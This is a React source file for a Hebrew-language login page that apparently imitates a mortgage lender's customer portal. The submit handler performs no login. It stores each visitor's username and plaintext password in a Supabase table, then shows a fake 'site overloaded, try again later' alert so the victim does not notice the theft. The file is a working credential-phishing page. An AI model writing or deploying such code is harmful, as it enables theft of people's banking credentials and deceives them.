
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { saveLoginData } from '../utils/dataStorage';

const LoginForm: React.FC = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Create data object
      const loginData = {
        username,
        password,
        rememberMe,
        timestamp: new Date().toISOString()
      };
      
      // Save the data to Supabase
      await saveLoginData(loginData);
      
      console.log('Login data saved:', loginData);
      
      // Clear form
      setUsername('');
      setPassword('');
      setRememberMe(false);
      
      alert('קיים עומס על מערכת האתר, נסה שוב מאוחר יותר');
    } catch (error) {
      console.error('Error saving data:', error);
      alert('שגיאה בשמירת הנתונים'); // "Error saving data" in Hebrew
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen gradient-bg flex items-center justify-center p-4">
      <div className="w-full max-w-md animate-slide-in">
        <div className="bg-white rounded-3xl card-shadow p-8 space-y-6">
          {/* Logo */}
          <div className="flex justify-center mb-8">
            <img 
              src="/lovable-uploads/a4d2a9fc-eada-4d63-80a1-0580128af6ba.png" 
              alt="Company Logo" 
              className="w-16 h-16 object-contain"
            />
          </div>

          {/* Title */}
          <div className="text-center">
            <h1 className="text-2xl font-semibold text-gray-800 mb-8">
              כניסה לחשבון שלי
            </h1>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Username Field */}
            <div className="space-y-2">
              <Input
                type="text"
                placeholder="שם משתמש"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full h-12 px-4 text-right border-gray-200 rounded-lg focus:border-orange focus:ring-orange transition-colors duration-200"
                dir="rtl"
                required
                disabled={isLoading}
              />
            </div>

            {/* Password Field */}
            <div className="space-y-2">
              <Input
                type="text"
                placeholder="סיסמה"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-12 px-4 text-right border-gray-200 rounded-lg focus:border-orange focus:ring-orange transition-colors duration-200"
                dir="rtl"
                required
                disabled={isLoading}
              />
            </div>

            {/* Login Button */}
            <div className="pt-4">
              <Button
                type="submit"
                disabled={isLoading}
                className="w-full h-12 bg-orange hover:bg-orange-hover text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50"
              >
                {isLoading ? 'שומר...' : 'כניסה לחשבון'}
              </Button>
            </div>
          </form>

          {/* Additional Options */}
          <div className="text-center pt-4">
            <a 
              href="#" 
              className="text-orange hover:text-orange-hover transition-colors duration-200 text-sm"
            >
              כניסה ללקוחות משכנתא בלבד
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
